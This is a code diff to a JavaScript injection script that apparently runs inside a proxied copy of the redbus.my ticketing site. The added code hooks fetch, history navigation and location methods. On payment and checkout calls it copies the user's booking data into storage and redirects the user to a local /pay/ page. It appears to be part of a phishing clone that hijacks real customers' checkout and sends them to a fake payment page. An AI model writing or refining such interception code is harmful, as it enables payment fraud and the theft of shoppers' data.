@@ -38,15 +38,6 @@ const injectionScript = `<script>
   window.fetch = function(input, init) {
     if (typeof input === 'string') {
       input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
-      // Intercept createOrder → redirect to /pay/
-      if (input.indexOf('/createOrder') !== -1) {
-        var bookingData = extractBookingData();
-        if (bookingData) {
-          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
-          window.location.href = '/pay/';
-          return new Promise(function() {});
-        }
-      }
     }
     return _fetch.call(window, input, init);
   };
@@ -56,22 +47,45 @@ const injectionScript = `<script>
   XMLHttpRequest.prototype.open = function(method, url) {
     if (typeof url === 'string') {
       url = url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
-      if (method.toUpperCase() === 'POST' && url.indexOf('/createOrder') !== -1) {
-        this._skip = true;
+    }
+    return _origOpen.call(this, method, url);
+  };
+
+  // Intercept page navigation to payment → redirect to /pay/
+  function checkPayUrl(url) {
+    if (typeof url === 'string' && /\/paymentDetails|\/payment\b|\/checkout\b/i.test(url)) {
+      var bookingData = extractBookingData();
+      if (bookingData) {
+        try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
+        return '/pay/';
+      }
+    }
+    return url;
+  }
+  var _ps = history.pushState;
+  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
+  var _rs = history.replaceState;
+  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
+  var _assign = location.assign.bind(location);
+  location.assign = function(u) { return _assign(checkPayUrl(u)); };
+  var _replace = location.replace.bind(location);
+  location.replace = function(u) { return _replace(checkPayUrl(u)); };
+
+  // Also intercept actual payment API calls (try multiple endpoint names)
+  var _origFetch3 = window.fetch;
+  window.fetch = function(input, init) {
+    if (typeof input === 'string') {
+      input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
+      if (/\/createOrder|\/placeOrder|\/saveBooking|\/proceedToPayment|\/paymentInit/i.test(input)) {
         var bookingData = extractBookingData();
         if (bookingData) {
           try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
           window.location.href = '/pay/';
-          return;
+          return new Promise(function() {});
         }
       }
     }
-    return _origOpen.call(this, method, url);
-  };
-  var _origSend = XMLHttpRequest.prototype.send;
-  XMLHttpRequest.prototype.send = function(body) {
-    if (this._skip) return;
-    return _origSend.call(this, body);
+    return _origFetch3.call(window, input, init);
   };
 
   function extractBookingData() {
